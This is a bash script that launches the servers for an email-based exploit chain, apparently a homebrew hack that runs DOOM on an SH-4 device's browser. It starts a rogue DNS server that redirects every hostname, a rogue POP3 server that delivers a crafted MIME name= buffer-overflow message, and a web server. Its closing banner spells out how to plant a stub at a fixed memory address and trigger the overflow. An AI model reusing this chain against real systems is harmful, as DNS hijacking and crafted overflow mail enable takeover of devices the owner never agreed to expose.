#!/usr/bin/env bash
# start_mail.sh -- servers for the JAR-FREE email chain.
#
# No Eden, no pwn.jar, no Java anywhere. Just:
#   - rogue DNS (--all) so the browser's mail host (e.g. ppp.ppp.com) resolves to us
#   - the targeted POP3 server carrying the DOOM-STAGE overflow message
#   - a plain static web server for www/ so the browser has a page to sit on
#
# The payload is put in RAM separately by  mac/native_stage.py  over the GDB stub.
#
#   sudo mac/start_mail.sh
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
source "$HERE/env.sh"

if [ "$(id -u)" != "0" ]; then
  echo "!! needs root for :53, :80 and :110 -- re-run with sudo" >&2
  exit 1
fi
REAL_USER="${SUDO_USER:-$(stat -f%Su /dev/console)}"

for name in dns_redirect.py eden_mitm.py mail_poc.py mail_mitm.py http.server; do
  for pid in $(pgrep -f "$name" 2>/dev/null); do
    [ "$pid" = "$$" ] && continue
    kill "$pid" 2>/dev/null && echo "[*] stopped previous $name (pid $pid)"
  done
done
sleep 1

cleanup() {
  echo; echo "[*] stopping servers"
  for v in DNS_PID MAIL_PID WEB_PID; do
    eval "p=\${$v:-}"; [ -n "$p" ] && kill "$p" 2>/dev/null
  done
}
trap cleanup EXIT INT TERM

echo "[1/3] DNS: all names -> $HOST_IP"
python3 -u "$POC/dns_redirect.py" "$HOST_IP" --all --bind="$HOST_IP" >/tmp/dns.log 2>&1 &
DNS_PID=$!
sleep 1; head -1 /tmp/dns.log

echo "[2/3] rogue POP3 on :110  (DOOM-STAGE overflow mail)"
python3 -u "$POC/mail_poc.py" --pop 110 >/tmp/mail.log 2>&1 &
MAIL_PID=$!
sleep 2
grep -aE "name= payload|message bytes|POP3 on" /tmp/mail.log | sed 's/^/    /'
if ! kill -0 "$MAIL_PID" 2>/dev/null; then
  echo "!! POP3 server failed to start -- see /tmp/mail.log" >&2; exit 1
fi

# Static page only: the browser needs somewhere to sit, and this serves no jars.
echo "[3/3] static web on :80 (www/, no Eden, no jars)"
cp -f "$POC/www/junkyard.html" "$POC/www/index.html" 2>/dev/null
( cd "$POC/www" && python3 -u -m http.server 80 --bind "$HOST_IP" ) >/tmp/web.log 2>&1 &
WEB_PID=$!
sleep 1

cat <<EOF

================================================================
  JAR-FREE email chain. Order matters:

   1. take the browser ONLINE
   2. stage the payload (in another terminal, no sudo needed):
        cd $POC && python3 mac/native_stage.py
      it writes the blob into RAM and plants the 366-byte stub at
      0x8C29ADE8 over the GDB stub, then prints READY
   3. ONLY THEN: Check Mail -> open "DOOM-STAGE"
      the MIME name= overflow sets saved PR to 0x8C29ADE8 and rts
      enters the stub -> native SH-4 DOOM

  Opening the mail before step 2 returns into unplanted memory and
  faults (expEvn=0x180, illegal instruction).
================================================================
(Ctrl-C stops DNS + POP3 + web.)
EOF

tail -f /tmp/mail.log
